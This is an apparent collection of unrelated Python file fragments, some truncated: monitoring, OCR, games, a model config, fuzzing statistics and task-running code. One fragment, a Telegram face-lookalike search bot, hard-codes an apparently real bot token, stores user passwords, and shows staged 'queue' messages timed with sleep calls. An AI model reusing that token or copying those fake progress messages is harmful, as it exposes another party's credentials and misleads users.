dom_name = dom.name()\n            \n            dom_state = dom.info()[0]\n            libvirt_domain_info_state.labels(domain=dom_name).set(dom_state)\n\n            # Get CPU stats\n            cpu_statas = dom.getCPUStats(True)[0]\n            libvirt_domain_info_cpu_time.labels(domain=dom_name).inc(cpu_statas.get('cpu_time', 0))\n            libvirt_domain_info_cpu_time_user.labels(domain=dom_name).inc(cpu_statas.get('user_time', 0))\n            libvirt_domain_info_cpu_time_system.labels(domain=dom_name).inc(cpu_statas.get('system_time', 0))\n\n            # Get memory stats\n            memory_stats = dom.memoryStats()\n            libvirt_domain_info_memory_actual.labels(domain=dom_name).set(memory_stats.get('actual'))\n            libvirt_domain_info_memory_usable.labels(domain=dom_name).set(memory_stats.get('usable'))\n            libvirt_domain_info_memory_unused.labels(domain=dom_name).set(memory_stats.get('unused'))\n            libvirt_domain_info_memory_available.labels(domain=dom_name).set(memory_stats.get('available'))\n\n            # Get block stats\n            for diskType in xml.getElementsByTagName('disk'):\n                diskNodes = diskType.childNodes\n                for diskNode in diskNodes:\n                    if diskNode.nodeName == 'target':\n                        disk_dev = diskNode.getAttribute('dev')\n                        rd_req, rd_byte, wr_req, wr_byte, _ = dom.blockStats(disk_dev)\n                        libvirt_domain_info_block_read_bytes.labels(dev=disk_dev, domain=dom_name).inc(rd_byte)\n                        libvirt_domain_info_block_read_requests.labels(dev=disk_dev, domain=dom_name).inc(rd_req)\n                        libvirt_domain_info_block_write_bytes.labels(dev=disk_dev, domain=dom_name).inc(wr_byte)\n                        libvirt_domain_info_block_write_requests.labels(dev=disk_dev, domain=dom_name).inc(wr_req)\n            \n            # Get network stats\n            for ifaceType in xml.getElementsByTagName('interface'):\n                ifaceNodes = ifaceType.childNode",
    "import streamlit as st\nimport PIL\nimport cv2\nimport numpy as np\nimport imutils\nimport easyocr\nimport tempfile\n\n\n# Setting page layout\nst.set_page_config(\n    page_title=\"Automatic Number Plate License Detection\",  # Setting page title\n    page_icon=\"\ud83d\ude97\",     # Setting page icon\n    layout=\"wide\",      # Setting layout to wide\n    initial_sidebar_state=\"expanded\",    # Expanding sidebar by default   \n)\n\n# Creating sidebar\nwith st.sidebar:\n    st.header(\"Image Config\")     # Adding header to sidebar\n    # Adding file uploader to sidebar for selecting images\n    source_img = st.file_uploader(\n        \"Upload an image...\", type=(\"jpg\", \"jpeg\", \"png\", 'bmp', 'webp'))\n    \n\n# Creating main page heading\nst.title(\"Automatic Number Plate License Detection\")\nst.caption('Upload an image of a vehicle with a number plate.')\nst.caption('Then click the :blue[Detect License Plate] button and check the result.')\n# Creating two columns on the main page\ncol1, col2 = st.columns(2)\n\n\n# Adding image to the first column if image is uploaded\nwith col1:\n    if source_img:\n        # Opening the uploaded image\n        uploaded_image = PIL.Image.open(source_img)\n        print(uploaded_image)\n        # Adding the uploaded image to the page with a caption\n        st.image(source_img,\n                 caption=\"Uploaded Image\",\n                 use_column_width=True\n                 )\n        \n\nif st.sidebar.button('Detect License Plate'):\n    # Save the uploaded image to a temporary file and read it\n    tfile = tempfile.NamedTemporaryFile(delete=True)\n    tfile.write(source_img.read())\n\n    # Read image\n    img = cv2.imread(tfile.name)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n    # Apply filter and find edges for localization\n    bfilter = cv2.bilateralFilter(gray, 11, 17, 17) #Noise reduction\n    edged = cv2.Canny(bfilter, 30, 200) #Edge detection\n\n    # Find contours and apply mask\n    keypoints = cv2.findContours(edged.copy(), cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n    contours = imutils.grab_contours(keypoints)\n    contours = sorted(contours, key=cv2.contourArea, reverse=True)[:10]\n\n    location = None\n    for contour in contours:\n        approx = cv2.approxPolyDP(contour, 10, True)\n        if len(approx) == 4:\n            location = approx\n            break\n\n    mask = np.zeros(gray.shape, np.uint8)\n    new_image = cv2.drawContours(mask, [location], 0,255, -1)\n    new_image = cv2.bitwise_and(img, img, mask=mask)\n\n\n    # Crop license plate\n    (x,y) = np.where(mask==255)\n    (topx, topy) = (np.min(x), np.min(y))\n    (bottomx, bottomy) = (np.max(x), np.max(y))\n    cropped_image = gray[topx:bottomx+1, topy:bottomy+1]\n\n\n    # Use Easy OCR to read text\n    reader = easyocr.Reader(['en'])\n    result = reader.readtext(cropped_image)\n\n    with col2:\n        try:\n            text = result[0][-2]\n        except Exception as e:\n            text = \"No Text Detected\"\n        font = cv2.FONT_HERSHEY_SIMPLEX\n        res = cv2.putText(img, text=text, org=(approx[0][0][0], approx[1][0][1]+60), fontFace=font, fontScale=1, color=(0,255,0), thickness=2, lineType=cv2.LINE_AA)\n        res = cv2.rectangle(img, tuple(approx[0][0]), tuple(approx[2][0]), (0,255,0),3)\n        st.image(cv2.cvtColor(res, cv2.COLOR_BGR2RGB), caption=\"Detected License Plate\", use_column_width=True)\n\n        try:\n            st.write(\"Detected License Plate:\", text)\n        except Exception as e:\n            st.write(\"No License Plate Detected\")",
    "# Todays Test:\n# Suppose you are building a system to manage student grades. # Implement a Python program that includes the following functionalities:\n# 1. A function to add a new student with their grades.\n# 2. A function to calculate the average grade of a student.\n# 3. A decorator function to ensure that Student is pass or fail in exam\n# 4. A function to retrieve the highest grade among all students.\n# 5. A function to retrieve the average grade of all students.\n# Constraints: - Use dictionaries to store student names as keys and their grades as values.\n\n#=================================function to add students=========================\n\n'''def decorator(funct):\n    def wrapper():\n        if grade > 5:\n            print(\"the number is fail\")\n        else:\n            print(\"good\")\n        funct\n    return wrapper'''\n\nstudent={}\nwhile True:\n    def add_student(student,name,grade):\n                student[name] = grade\n                return student\n\n\n    name = input(\"enter the name :\")\n    grade = int(input(\"enter the grade out of (10):\"))\n    print(add_student(student,name, grade))\n\n    print(\"do you want to continue \\n\")\n    z=input(\"enter your choice y/n:\")\n    if z == 'y':\n        continue\n    else:\n        break\n\ndef average(student):\n            total=sum(student.values())\n            avg_grade=total/len(student)\n            print(\"the average is :\",avg_grade)\n\ndef highest(student):\n       high_mark=max(student.values())\n       print(\"the highest grade is :\",high_mark)\n\n\ndef main():\n       average(student)\n       highest(student)\n\nif __name__=='__main__':\n       main()\n\n\n\n\n\n\n\n\n\n\n    \n\n",
    "import pygame\nimport random\n\n# Initialize Pygame\npygame.init()\n\n# Set up some constants\nWIDTH, HEIGHT = 640, 480\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nGRAY = (200, 200, 200)\n\n# Set up the display\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption(\"Jogo da adivinha\u00e7\u00e3o\")\n\n# Set up the font\nFONT = pygame.font.SysFont(\"Arial\", 24)\n\n# Set up the game state\nnumber_to_guess = random.randint(1, 100)\nguess = \"\"\nguesses = 0\nnotification = \"\"\n\n# Function to draw text on screen\ndef draw_text(text, font, color, surface, x, y):\n    textobj = font.render(text, 1, color)\n    textrect = textobj.get_rect()\n    textrect.topleft = (x, y)\n    surface.blit(textobj, textrect)\n\n# Set up the game loop\nrunning = True\nwhile running:\n    # Handle events\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n        elif event.type == pygame.KEYDOWN:\n            if event.key == pygame.K_RETURN:\n                if guess.isdigit():\n                    guesses += 1\n                    if int(guess) < number_to_guess:\n                        notification = \"O valor \u00e9 maior do que seu palpite!\"\n                    elif int(guess) > number_to_guess:\n                        notification = \"O valor \u00e9 menor do que seu palpite!\"\n                    else:\n                        notification = \"Parabens! Voc\u00ea acertou em \" + str(guesses) + \" tentativas!\"\n                        guess = \"\"\n                else:\n                    notification = \"Inv\u00e1lido!\"\n                    guess = \"\"\n            elif event.key == pygame.K_BACKSPACE:\n                guess = guess[:-1]\n            else:\n                if event.unicode.isdigit() and len(guess) < 3:\n                    guess += str(event.unicode)\n\n    # Update the screen\n    screen.fill(WHITE)\n    draw_text(\"Advinhe em que n\u00famero estou pensando em entre 1 e 100!\", FONT, BLACK, screen, 10, 10)\n    draw_text(\"Palpite: \" + guess, FONT, BLACK, screen, 10, 50)\n    draw_text(notification, FONT, BLACK, screen, 10, 90)\n\n    # Draw input box\n    pygame.draw.rect(screen, BLACK, (10, 130, 200, 40), 2)\n    pygame.draw.rect(screen, GRAY, (12, 132, 196, 36))\n\n    # Draw buttons\n    pygame.draw.rect(screen, BLACK, (250, 130, 100, 40), 2)\n    draw_text(\"Palpite\", FONT, BLACK, screen, 260, 140)\n\n    pygame.draw.rect(screen, BLACK, (370, 130, 100, 40), 2)\n    draw_text(\"Resetar\", FONT, BLACK, screen, 380, 140)\n\n    pygame.display.flip()\n\n# Quit Pygame\npygame.quit()\n",
    "# coding=utf-8\n# Copyright 2024 The Qwen team, Alibaba Group and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" Qwen2 model configuration\"\"\"\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.utils import logging\n\n\nlogger = logging.get_logger(__name__)\n\nQWEN2_PRETRAINED_CONFIG_ARCHIVE_MAP = {\n    \"Qwen/Qwen2-7B-beta\": \"https://huggingface.co/Qwen/Qwen2-7B-beta/resolve/main/config.json\",\n}\n\n\nclass Qwen2Config(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`Qwen2Model`]. It is used to instantiate a\n    Qwen2 model according to the specified arguments, defining the model architecture. Instantiating a configuration\n    with the defaults will yield a similar configuration to that of\n    Qwen2-7B-beta [Qwen/Qwen2-7B-beta](https://huggingface.co/Qwen/Qwen2-7B-beta).\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        vocab_size (`int`, *optional*, defaults to 151936):\n            Vocabulary size of the Qwen2 model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`Qwen2Model`]\n        hidden_size (`int`, *optional*, defaults to 4096):\n            Dimension of the hidden representations.\n        intermediate_size (`int`, *optional*, defaults to 22016):\n            Dimension of the MLP representations.\n        num_hidden_layers (`int`, *optional*, defaults to 32):\n            Number of hidden layers in the Transformer encoder.\n        num_attention_heads (`int`, *optional*, defaults to 32):\n            Number of attention heads for each attention layer in the Transformer encoder.\n        num_key_value_heads (`int`, *optional*, defaults to 32):\n            This is the number of key_value heads that should be used to implement Grouped Query Attention. If\n            `num_key_value_heads=num_attention_heads`, the model will use Multi Head Attention (MHA), if\n            `num_key_value_heads=1 the model will use Multi Query Attention (MQA) otherwise GQA is used. When\n            converting a multi-head checkpoint to a GQA checkpoint, each group key and value head should be constructed\n            by meanpooling all the original heads within that group. For more details checkout [this\n            paper](https://arxiv.org/pdf/2305.13245.pdf). If it is not specified, will default to `32`.\n        hidden_act (`str` or `function`, *optional*, defaults to `\"silu\"`):\n            The non-linear activation function (function or string) in the decoder.\n        max_position_embeddings (`int`, *optional*, defaults to 32768):\n            The maximum sequence length that this model might ever be used with.\n        initializer_range (`float`, *optional*, defaults to 0.02):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n        rms_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the rms normalization layers.\n        use_cache (`bool`, *optional*, defaults to `True`):\n            Whether or not the model should return the last key/values attentions (not used by all models). Only\n            relevant if `config.is_decoder=True`.\n        tie_word_embeddings (`bool`, *optional*, defaults to `False`):\n            Whether the model's input and output word embeddings should be tied.\n        rope_theta (`float`, *optional*, defaults to 10000.0):\n            The base period of the RoPE embeddings.\n        use_sliding_window (`bool`, *optional*, defaults to `False`):\n            Whether to use sliding window attention.\n        sliding_window (`int`, *optional*, defaults to 4096):\n            Sliding window attention (SWA) window size. If not specified, will default to `4096`.\n        max_window_layers (`int`, *optional*, defaults to 28):\n            The number of layers that use SWA (Sliding Window Attention). The bottom layers use SWA while the top use full attention.\n        attention_dropout (`float`, *optional*, defaults to 0.0):\n            The dropout ratio for the attention probabilities.\n\n    ```python\n    >>> from transformers import Qwen2Model, Qwen2Config\n\n    >>> # Initializing a Qwen2 style configuration\n    >>> configuration = Qwen2Config()\n\n    >>> # Initializing a model from the Qwen2-7B style configura",
    "from urllib import request\r\nimport dlib, time, telebot, sqlite3, shutil, os, subprocess, cv2, threading\r\nfrom functools import partial\r\n\r\n# Configura\u00e7\u00f5es do bot\r\nTOKEN = '6671840751:AAHHsQEnXow-eo467qrNv6h7C8qrw_QTOQ4'\r\n\r\n# Conex\u00e3o com o banco de dados SQLite\r\nconn = sqlite3.connect('users.db', check_same_thread=False)\r\ncursor = conn.cursor()\r\n\r\n# Cria\u00e7\u00e3o da tabela se n\u00e3o existir\r\ncursor.execute('''\r\n    CREATE TABLE IF NOT EXISTS users (\r\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n        telegram_id INT,\r\n        name TEXT,\r\n        username TEXT,\r\n        number TEXT,\r\n        email TEXT,\r\n        balance REAL,\r\n        password TEXT,\r\n        photo BLOB,\r\n        folder_name TEXT\r\n    )\r\n''')\r\nconn.commit()\r\n\r\n# Criar inst\u00e2ncia do bot\r\nbot = telebot.TeleBot(TOKEN)\r\nestados_permitir_foto = {}\r\nfila = []\r\n#permitir_foto = False\r\n\r\ndef enviar_notificacao(user_id, mensagem):\r\n    bot.send_message(user_id, mensagem)\r\n\r\n\r\ndef processar_solicitacao(user_id):\r\n    # Aqui voc\u00ea pode escrever o c\u00f3digo para processar a solicita\u00e7\u00e3o\r\n    print(\"Etapa 4 - Processando Solicita\u00e7\u00e3o:\", user_id)\r\n    # e obter o resultado desejado\r\n    resultado = f\"Processando solicita\u00e7\u00e3o para o ID do usu\u00e1rio: {user_id}\"\r\n    return resultado\r\n\r\n\r\n@bot.message_handler(commands=['buscar_sosia'])\r\ndef buscar_pessoa_command(message):\r\n    # Pegar o ID do usu\u00e1rio que solicitou o comando\r\n    user_id = message.from_user.id\r\n    #global permitir_foto\r\n    estados_permitir_foto[user_id] = True\r\n    folder_name = str(user_id)\r\n    if not os.path.exists(folder_name):\r\n        os.makedirs(folder_name)\r\n    # Copiar o arquivo facecheck.py para a pasta permanente\r\n    #shutil.copy('facecheck.py', os.path.join(folder_name, 'facecheck.py'))\r\n    # Enviar uma resposta ao usu\u00e1rio\r\n    \r\n    bot.reply_to(message, \"Envie uma imagem em boa qualidade e iremos buscar imagens suas ou de pessoas parecidas com voc\u00ea ao redor do mundo!\")     \r\n\r\ndef is_fila_vazia():\r\n    return len(fila) == 0\r\n@bot.message_handler(content_types=['photo'])\r\ndef upload_image(message):\r\n    # Pegar o ID do usu\u00e1rio que enviou a imagem\r\n    user_id = message.from_user.id\r\n\r\n    # Verificar o estado de permitir_foto para o user_id espec\u00edfico\r\n    if not estados_permitir_foto.get(user_id, False):\r\n        # Informar ao usu\u00e1rio que o envio de fotos est\u00e1 restrito\r\n        bot.reply_to(message, \"O envio de fotos est\u00e1 restrito. Use o comando /buscar_sosia e voc\u00ea poder\u00e1 enviar fotos!\")\r\n        return\r\n\r\n    folder_name = str(user_id)\r\n    image_file = bot.get_file(message.photo[-1].file_id)\r\n    image_path = image_file.file_path\r\n    image_url = f\"https://api.telegram.org/file/bot{TOKEN}/{image_path}\"\r\n    response = request.urlopen(image_url)\r\n    id_usuario = user_id\r\n\r\n    with open(os.path.join(folder_name, 'completa.jpg'), 'wb') as f:\r\n        f.write(response.read())\r\n\r\n    # Carregar o classificador de faces do dlib\r\n    detector = dlib.get_frontal_face_detector()\r\n\r\n    # Carregar a imagem usando o OpenCV\r\n    image = cv2.imread(os.path.join(folder_name, 'completa.jpg'))\r\n\r\n    # Converter para escala de cinza\r\n    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\r\n\r\n    # Detectar rostos na imagem\r\n    faces = detector(gray)\r\n\r\n    # Verificar se foi encontrado algum rosto\r\n    if len(faces) > 0:\r\n        # Definir o fator de aumento do tamanho do recorte\r\n        scale_factor = 2.0  # Voc\u00ea pode ajustar esse valor conforme necess\u00e1rio\r\n\r\n        # Recortar e salvar apenas o primeiro rosto encontrado\r\n        face = faces[0]\r\n        (x, y, w, h) = (face.left(), face.top(), face.width(), face.height())\r\n\r\n        # Aplicar o fator de aumento ao tamanho do recorte\r\n        new_w = int(w * scale_factor)\r\n        new_h = int(h * scale_factor)\r\n\r\n        # Ajustar as coordenadas para garantir que o recorte permane\u00e7a dentro dos limites da imagem\r\n        x = max(0, x - (new_w - w) // 2)\r\n        y = max(0, y - (new_h - h) // 2)\r\n\r\n        # Recortar a face com as novas coordenadas e dimens\u00f5es\r\n        cropped_face = image[y:y+new_h, x:x+new_w]\r\n\r\n        # Salvar a face recortada\r\n        cv2.imwrite(os.path.join(folder_name, 'imagem.jpg'), cropped_face)\r\n\r\n        # Enviar uma resposta ao usu\u00e1rio\r\n        bot.reply_to(message, \"O rosto da sua imagem foi reconhecido, iremos fazer a busca por toda internet, isso pode demorar alguns minutos!  Agora iremos te adiicionar em uma fila!\")\r\n        time.sleep(5)\r\n        bot.reply_to(message, \"Procurando fila...\")\r\n        time.sleep(8)\r\n        \r\n        # L\u00f3gica adicional ap\u00f3s o processamento bem-sucedido\r\n        fila.append(user_id)\r\n        posicao_fila = len(fila)\r\n        bot.send_message(chat_id=message.chat.id, text=f\"Fila encontrada! Voc\u00ea est\u00e1 em {posicao_fila}\u00b0 na fila!\")\r\n\r\n        tempo_espera = 360 * posicao_fila  # Multiplica o tempo de espera pela posi\u00e7\u00e3o do usu\u00e1rio na fila\r\n        time.sleep(tempo_espera)\r\n        if not is_fila_vazia():\r\n            id_removido = fila.pop(0)\r\n            subprocess.run(['python', 'facecheck.py'",
    "import inspect\n\nfrom .sync import iscoroutinefunction\n\n\ndef is_double_callable(application):\n    \"\"\"\n    Tests to see if an application is a legacy-style (double-callable) application.\n    \"\"\"\n    # Look for a hint on the object first\n    if getattr(application, \"_asgi_single_callable\", False):\n        return False\n    if getattr(application, \"_asgi_double_callable\", False):\n        return True\n    # Uninstanted classes are double-callable\n    if inspect.isclass(application):\n        return True\n    # Instanted classes depend on their __call__\n    if hasattr(application, \"__call__\"):\n        # We only check to see if its __call__ is a coroutine function -\n        # if it's not, it still might be a coroutine function itself.\n        if iscoroutinefunction(application.__call__):\n            return False\n    # Non-classes we just check directly\n    return not iscoroutinefunction(application)\n\n\ndef double_to_single_callable(application):\n    \"\"\"\n    Transforms a double-callable ASGI application into a single-callable one.\n    \"\"\"\n\n    async def new_application(scope, receive, send):\n        instance = application(scope)\n        return await instance(receive, send)\n\n    return new_application\n\n\ndef guarantee_single_callable(application):\n    \"\"\"\n    Takes either a single- or double-callable application and always returns it\n    in single-callable style. Use this to add backwards compatibility for ASGI\n    2.0 applications to your server/test harness/etc.\n    \"\"\"\n    if is_double_callable(application):\n        application = double_to_single_callable(application)\n    return application\n",
    "import sys\nimport os\nimport pandas as pd\nfrom matplotlib import pyplot as plt\nfrom venn import venn\nfrom itertools import combinations\n\n\"\"\"\nAnalyze magma-bugs.csv. Make some stats and draw some venns.\n\"\"\"\n\nn_trial = 10\nfuzzers = ['afl', 'aflplusplus', 'aflplusplus_z', 'aflpluzpluz_dipri_ah', 'aflpluzpluz_dipri_vh']\nfuzzer_map = {\n    'afl': 'afl',\n    'aflplusplus': 'aflpp',\n    'aflplusplus_z': 'aflpp-Z',\n    'aflplusplus_dipri_ah': 'dipri-AH',\n    'aflplusplus_dipri_vh': 'dipri-VH',\n    'k_scheduler': 'k-scheduler',\n}\nall_bugs = [\n    # libpng (libpng_read_fuzzer), total=7\n    'PNG001', 'PNG002', 'PNG003', 'PNG004', 'PNG005',\n    'PNG006', 'PNG007',\n    # libtiff (tiff_read_rgba_fuzzer, tiffcp), total=14\n    'TIF001', 'TIF002', 'TIF003', 'TIF004', 'TIF005',\n    'TIF006', 'TIF007', 'TIF008', 'TIF009', 'TIF010',\n    'TIF011', 'TIF012', 'TIF013', 'TIF014',\n    # libxml2 (xmllint libxml2_xml_read_memory_fuzzer), total=17\n    'XML001', 'XML002', 'XML003', 'XML004', 'XML005',\n    'XML006', 'XML007', 'XML008', 'XML009', 'XML010',\n    'XML011', 'XML012', 'XML013', 'XML014', 'XML015',\n    'XML016', 'XML017',\n    # sqlite (sqlite3_fuzz), total=20\n    'SQL001', 'SQL002', 'SQL003', 'SQL004', 'SQL005',\n    'SQL006', 'SQL007', 'SQL008', 'SQL009', 'SQL010',\n    'SQL011', 'SQL012', 'SQL013', 'SQL014', 'SQL015',\n    'SQL016', 'SQL017', 'SQL018', 'SQL019', 'SQL020',\n    # lua (lua), total=4\n    'LUA001', 'LUA002', 'LUA003', 'LUA004',\n    # libsndfile (sndfile_fuzzer), total=18\n    'SND001', 'SND002', 'SND003', 'SND004', 'SND005',\n    'SND006', 'SND007', 'SND008', 'SND009', 'SND010',\n    'SND011', 'SND012', 'SND013', 'SND014', 'SND015',\n    'SND016', 'SND017', 'SND018',\n]\n\ndef count_total_bugs(bugs: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"\n    Count the bugs for statistics.\n    \"\"\"\n    _data = []\n    for _project in sorted(bugs['project'].drop_duplicates().to_numpy()):\n        _proj_data = bugs.loc[bugs['project'] == _project]\n        for _target in _proj_data['target'].drop_duplicates():\n            _target_data = _proj_data.loc[_proj_data['target'] == _target]\n            for _type in bugs['find_type'].drop_duplicates():\n                _target_dict = dict(project=_project, target=_target, find_type=_type)\n                for _fuzzer in fuzzer_map:\n                    _camp_data = _target_data.loc[(_target_data['fuzzer'] == _fuzzer) &\n                                                  (_target_data['find_type'] == _type)]\n                    _n_total_bug = 0\n                    _n_unique_bug = 0\n                    _fuzzer_name = fuzzer_map[_fuzzer]\n                    if not _camp_data.empty:\n                        _n_total_bug = _camp_data['bug'].size\n                        _n_unique_bug = _camp_data['bug'].drop_duplicates().size\n                    _target_dict[f'{_fuzzer_name}-total'] = _n_total_bug\n                    _target_dict[f'{_fuzzer_name}-unique'] = _n_unique_bug\n                _data.append(_target_dict)\n    return pd.DataFrame(data=_data)\n\ndef count_total_bugs2(bugs: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"\n    Count the bugs for statistics.\n    \"\"\"\n    _data = []\n    for _project in sorted(bugs['project'].drop_duplicates().to_numpy()):\n        _proj_data = bugs.loc[bugs['project'] == _project]\n        for _target in _proj_data['target'].drop_duplicates():\n            _target_data = _proj_data.loc[_proj_data['target'] == _target]\n            _target_dict = dict(project=_project, target=_target)\n            for _fuzzer in fuzzer_map:\n                for _type in bugs['find_type'].drop_duplicates():\n                    _camp_data = _target_data.loc[(_target_data['fuzzer'] == _fuzzer) &\n                                                  (_target_data['find_type'] == _type)]\n                    _n_total_bug = 0\n                    _n_unique_bug = 0\n                    _fuzzer_name = fuzzer_map[_fuzzer]\n                    if not _camp_data.empty:\n                        _n_total_bug = _camp_data['bug'].size\n                        _n_unique_bug = _camp_data['bug'].drop_duplicates().size\n                    _target_dict[f'{_fuzzer_name}-{_type}-total'] = _n_total_bug\n                    _target_dict[f'{_fuzzer_name}-{_type}-unique'] = _n_unique_bug\n            _data.append(_target_dict)\n    return pd.DataFrame(data=_data)\n\n\ndef count_total_bugs_by_type(bugs: pd.DataFrame, find_type: str) -> pd.DataFrame:\n    \"\"\"\n    Count the bugs for statistics.\n    \"\"\"\n    _data = []\n    for _project in sorted(bugs['project'].drop_duplicates().to_numpy()):\n        _proj_data = bugs.loc[bugs['project'] == _project]\n        for _target in _proj_data['target'].drop_duplicates():\n            _target_data = _proj_data.loc[_proj_data['target'] == _target]\n            _target_dict = dict(project=_project, target=_target)\n            for _fuzzer in fuzzer_map:\n                if _target == 'libxml2_xml_read_memory_fuzzer' and find_type == 'reached':\n                    # This target is problematic, do not distinguish reached and triggere",
    "\"\"\"A progress bar for the command line\"\"\"\nimport sys\nimport time\n\n\nclass Progress:\n    \"\"\"Progress bar object for the comand line\n\n    This class allows to conveniently add progress bars to long running\n    calculations. It writes textual and graphical information about\n    the progress of a text to sys.stderr. To be used in the following\n    way:\n\n    >>> prog = Progress(100, \"Performing some long running task\")\n    >>> for step in some_long_calculation():\n    >>>     prog += 1\n    >>>     prog.show()\n    >>> prog.finish()\n\n    The progress bar displays the percentage of completion\n    (counter/total) and the real time taken by the calculation so far.\n\n    It is allowed to manually alter prog.counter and prog.total during\n    use.\n    \"\"\"\n    def __init__(self, total, title=\"Progress\", width=80):\n        \"\"\"Initialize Progress bar\n\n        Parameters:\n        total (number) -- maximum value of counter\n        title (str) -- information to be displayed\n        width (int) -- width of the display progress bar\n        \"\"\"\n        self.counter = 0\n        self.total = total\n        self.title = title\n        self.width = width\n        self.start_time = time.time()\n\n    def __iadd__(self, value):\n        \"\"\"Increase current counter by value\"\"\"\n        self.counter += value\n        return self\n\n    def show(self):\n        \"\"\"Display progress bar in its current state\"\"\"\n        sec = time.time()-self.start_time\n        # eta = self.total/self.counter*sec-sec if self.counter else 0\n        percent = 100*self.counter/self.total\n        title = f'{self.title} ({percent:.0f}% {sec//60:02.0f}:{sec%60:02.0f}) '\n        if len(title) >= self.width:\n            raise ValueError(\"Progress bar does not fit width. Shorten title of increase width.\")\n        bar_width = self.width - (len(title)) - 3\n        full_width = int(bar_width*self.counter/self.total)\n        empty_width = bar_width - full_width\n        sys.stdout.write('\\r'+title+'['+full_width*'#'+empty_width*'.'+']')\n        sys.stdout.flush()\n\n    def finish(self):\n        \"\"\"Hide progress bar\"\"\"\n        sys.stdout.write('\\r'+self.width*' '+'\\r')\n        sys.stdout.flush()\n",
    "\"\"\"\n===========================================\nTask definition for igniiite init framework\n===========================================\n\n:Authors: - Florian Dupeyron <florian.dupeyron@mugcat.fr>\n:Date: April 2024\n\"\"\"\n\nimport asyncio\nimport signal\nimport logging\n\nimport traceback\n\nfrom   dataclasses     import dataclass, field\nfrom   enum            import Enum\n\nfrom   collections.abc import Coroutine\nfrom   typing          import Set\n\n\nasync def null_hook(self):\n   pass\n\nasync def default_ready_hook(self):\n   self.set_ready()\n\nclass TaskListeners:\n   def __init__(self):\n      self.listeners = set()\n      self.semaphore = asyncio.Semaphore()\n\n   async def register(self, listener):\n      async with self.semaphore:\n         self.listeners.add(listener)\n\n   async def unregister(self, listener):\n      async with self.semaphore:\n         self.listeners.discard(listener)\n\n@dataclass\nclass Task:\n   name:    str\n   command: str\n\n   dependencies: Set[\"Task\"] = field(default_factory=set)\n\n   pre_hook: Coroutine   = null_hook\n   post_hook: Coroutine  = null_hook\n   kill_hook: Coroutine  = null_hook\n   ready_hook: Coroutine = default_ready_hook\n\n\n   def __post_init__(self):\n      self.process          = None\n      #self.log              = logger.bind(name=self.name)\n      self.log              = logging.getLogger(self.name)\n      self.ended            = asyncio.Event()\n      self.ready            = asyncio.Event()\n\n      self.failed           = asyncio.Event()\n\n      self.stdout_listeners = TaskListeners()\n      self.stderr_listeners = TaskListeners()\n\n   def __hash__(self):\n      return hash(self.name)\n\n   async def __stream_data(self, stream, listeners = None):\n      try:\n         async for line in stream:\n            line_str = line.decode(\"utf-8\").strip()\n            self.log.info(line_str)\n            \n            if listeners is not None:\n               async with listeners.semaphore:\n                  for listener in listeners.listeners:\n                     await listener.put(line_str)\n\n      except asyncio.CancelledError:\n         pass\n\n      except Exception as exc:\n         self.log.error(traceback.format_exc())\n\n\n   async def __send_stop(self):\n      try:\n         self.log.error(\"Sending process SIGINT signal\")\n         self.process.send_signal(signal.SIGINT)\n      except ProcessLookupError:\n         pass # Ignore process if already finished.\n\n\n   async def __send_kill(self):\n      try:\n         self.log.error(\"Sending process SIGKILL signal\")\n         self.process.send_signal(signal.SIGKILL)\n      except ProcessLookupError:\n         pass # Ignore process if already finished.\n\n\n   def set_ready(self):\n      self.log.info(f\"Process '{self.name}' is ready!\")\n      self.ready.set()\n\n\n   async def run(self):\n      self.log.info (f\"Start process '{self.name}'\")\n      self.log.debug(f\"Command: '{self.command}'\"  )\n      self.ended.clear()\n      self.ready.clear()\n      self.failed.clear()\n\n      try:\n         await asyncio.wait_for(self.pre_hook(self), timeout=60.0)\n\n         # Wait for dependencies to be started\n         async def wait_for_task(tt):\n            task_ready = asyncio.create_task(tt.ready.wait())\n            task_failed = asyncio.create_task(tt.failed.wait())\n\n            done, pending = await asyncio.wait([\n               task_ready,\n               task_failed,\n            ], return_when=asyncio.FIRST_COMPLETED)\n\n            # See if failed condition exited first\n            if tt.failed.is_set():\n               raise RuntimeError(f\"Dependency '{tt.name}' has failed during process start\")\n\n            # Cancel pending tasks\n            for task in pending:\n               task.cancel()\n\n         await asyncio.gather(*[\n            wait_for_task(tt) for tt in self.dependencies\n         ])\n\n         self.process = await asyncio.create_subprocess_exec(\n            *self.command,\n\n            stdout = asyncio.subprocess.PIPE,\n            stderr = asyncio.subprocess.PIPE,\n         )\n\n         task_stdout     = asyncio.create_task(self.__stream_data(self.process.stdout, self.stdout_listeners))\n         task_stderr     = asyncio.create_task(self.__stream_data(self.process.stderr, self.stderr_listeners))\n         task_ready_hook = asyncio.create_task(self.ready_hook(self))\n\n         try:\n            await self.process.wait()\n\n         except asyncio.CancelledError:\n            self.log.warning(\"Requested task stop\")\n            await self.__send_stop()\n\n\n            try:\n               self.log.info(\"Wait for process to terminate...\")\n               await asyncio.wait_for(self.process.wait(), timeout=10.0)\n            except asyncio.TimeoutError:\n               self.log.error(\"Failed to stop process gracefully, KILLING IT WITH FIRE\")\n               await self.__send_kill()\n               try:\n                  await self.kill_hook(self)\n               except asyncio.TimeoutError:\n                  